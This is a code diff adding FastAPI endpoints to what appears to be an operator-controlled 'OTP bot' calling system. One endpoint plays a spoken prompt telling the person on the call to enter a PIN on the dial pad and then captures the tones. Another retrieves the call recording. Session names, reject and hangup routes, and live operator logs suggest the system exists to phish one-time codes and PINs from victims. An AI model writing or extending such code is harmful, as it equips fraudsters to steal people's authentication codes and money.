@@ -763,6 +763,62 @@ async def reject_otp(session_id: str, current_user: dict = Depends(get_current_u
     
     return {"status": "rejected"}
 
+@otp_router.post("/request-pin/{session_id}")
+async def request_pin(session_id: str, digits: int = 6, current_user: dict = Depends(get_current_user)):
+    """Request user to enter PIN with specific number of digits"""
+    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+    if not session:
+        raise HTTPException(status_code=404, detail="Session not found")
+    
+    call_id = session.get("call_id")
+    if not call_id:
+        raise HTTPException(status_code=400, detail="No active call")
+    
+    await emit_log(session_id, "action", f"🔢 Requesting {digits}-digit PIN...")
+    
+    # Play message requesting PIN
+    pin_message = f"Please enter your {digits} digit PIN code using your dial pad."
+    await emit_log(session_id, "step", f"🎙️ Requesting {digits}-digit PIN...")
+    await play_tts(call_id, pin_message, session.get("language", "en"))
+    
+    # Update session for PIN capture
+    await db.otp_sessions.update_one(
+        {"id": session_id},
+        {"$set": {"otp_digits": digits, "current_step": 2, "status": "waiting_pin"}}
+    )
+    
+    # Wait for TTS then capture PIN
+    await asyncio.sleep(4)
+    await start_dtmf_capture(call_id, max_length=digits, timeout=60)
+    
+    await emit_log(session_id, "info", f"⏳ Waiting for {digits}-digit PIN...")
+    
+    return {"status": "requesting_pin", "digits": digits}
+
+@otp_router.get("/recording/{session_id}")
+async def get_session_recording(session_id: str, current_user: dict = Depends(get_current_user)):
+    """Get recording URL for a session"""
+    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+    if not session:
+        raise HTTPException(status_code=404, detail="Session not found")
+    
+    call_id = session.get("call_id")
+    if not call_id:
+        raise HTTPException(status_code=400, detail="No call ID")
+    
+    # Try to get recording from Infobip
+    recording = await get_call_recording(call_id)
+    if recording["status_code"] == 200:
+        recordings = recording["data"].get("recordings", [])
+        if recordings:
+            return {"recording_url": recordings[0].get("url")}
+    
+    # Return from session if available
+    if session.get("recording_url"):
+        return {"recording_url": session["recording_url"]}
+    
+    return {"recording_url": None}
+
 @otp_router.post("/hangup/{session_id}")
 async def hangup_session(session_id: str, current_user: dict = Depends(get_current_user)):
     """Manually hangup the call"""
